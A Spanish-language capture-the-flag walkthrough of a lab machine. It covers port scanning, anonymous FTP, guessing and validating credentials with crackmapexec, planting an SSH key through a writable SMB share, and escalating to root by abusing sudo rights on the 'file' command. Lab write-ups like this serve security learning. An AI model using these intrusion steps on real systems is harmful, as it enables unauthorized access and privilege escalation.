## Escaneo
Realizo un escaneo inicial en búsqueda de puertos abiertos.
```
nmap -p- --open --min-rate 4000 -sS -n -Pn 172.17.0.2 -oG puertos
```

El resultado obtenido son los puertos *21,22,139,445*
Realizo un escaneo en búsqueda de servicios y versiones

```
nmap -p21,22,139,445 -sCV 172.17.0.2 -oN escaneo

   5      │ PORT    STATE SERVICE     VERSION
   6   │ 21/tcp  open  ftp         vsftpd 3.0.5
   7   │ | ftp-syst: 
   8   │ |   STAT: 
   9   │ | FTP server status:
  10   │ |      Connected to ::ffff:172.17.0.1
  11   │ |      Logged in as ftp
  12   │ |      TYPE: ASCII
  13   │ |      No session bandwidth limit
  14   │ |      Session timeout in seconds is 300
  15   │ |      Control connection is plain text
  16   │ |      Data connections will be plain text
  17   │ |      At session startup, client count was 4
  18   │ |      vsFTPd 3.0.5 - secure, fast, stable
  19   │ |_End of status
  20   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  21   │ |_-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
  22   │ 22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
  23   │ | ssh-hostkey: 
  24   │ |   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
  25   │ |_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
  26   │ 139/tcp open  netbios-ssn Samba smbd 4
  27   │ 445/tcp open  netbios-ssn Samba smbd 4
  28   │ MAC Address: AA:33:CB:DA:D9:B8 (Unknown)
  29   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  30   │ 
  31   │ Host script results:
  32   │ | smb2-time: 
  33   │ |   date: 2026-04-08T13:43:50
  34   │ |_  start_date: N/A
  35   │ | smb2-security-mode: 
  36   │ |   3.1.1: 
  37   │ |_    Message signing enabled but not required
```

### FTP - Acceso Anónimo
Ingreso a *ftp* con el usuario *anonymous*
```
ftp 172.17..2
```
Encuentro un archivo *nota.txt* lo descargo para poder ver su contenido.
```
get nota.txt
```

Contenido:
```
I don't know what to do with Macarena, she's obsessed with donald.
```

Identifico un posible usuario y posible contraseña, las valido crackmapexec 
```
crackmapexec smb 172.17.0.2 -u macarena -p donald
```
Las credenciales son validas para utilizar *smb*

### Enumeración SMB
Realizo una enumeración de smb 
```
crackmapexec smb 172.17.0.2 -u macarena -p donald --shares
```
Encuentro que para la carpeta **macarena** se tiene permisos de escritura y lectura.

### Acceso al home vía SMB
```
smbclient //172.17.0.2/macarena -U macarena

.bashrc
.profile
.bash_history
user.txt
```

## Acceso inicial - SSH key injection
En mi kali genero clave ssh
```
ssh-keygen -t rsa -b 4096
```
Preparo el archivo
```
cp ~/.ssh/id_rsa.pub .
cat id_rsa.pub > authorized_keys
```

Lo subo a la maquina victima
```
mkdir .ssh
cd .ssh
put id_rsa.pub
put authorized_keys
```

### Acceso SSH
Ingreso a ssh con la id_rsa creada:
```
ssh -i ~/.ssh/id_rsa macarena@172.17.0.2
```
Accedo como el usuario *macarena*

## Enumeración interna
Encuentro una carpeta interesante:
```
cd /home
ls
	ftp
	macarena
	secret
```
En la carpeta *secret* encuentro un archivo **hash**

```
cat /home/secret/hash

MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
```

Lo decodifico para observar su contenido
```
echo 'MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===' | base32 -d | base64 -d

supersecurepassword
```

Intento ingresar a root pero la contraseña no funciona, utilizo crackmapexec para validar con el usuario macarena
```
❯ crackmapexec ssh 172.17.0.2 -u macarena -p supersecurepassword
SSH         172.17.0.2      22     172.17.0.2       [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4
SSH         172.17.0.2      22     172.17.0.2       [+] macarena:supersecurepassword
```

### Enumeración SUDO
Realizo búsqueda de posibles escalada de privilegio
```
sudo-l

(ALL : ALL) /usr/bin/file
```
Se puede ejecutar *file* como root

## Escalada de privilegios

Se encuentra en la carpeta opt un archivo protegido.
```
/opt/password.txt
```

Utilizo file como root para leer el archivo
```
sudo /usr/bin/file -f /opt/password.txt

root:rooteable2

```

#### Root
```
su root

rooteable2

id
uid=0(root) gid=0(root)
```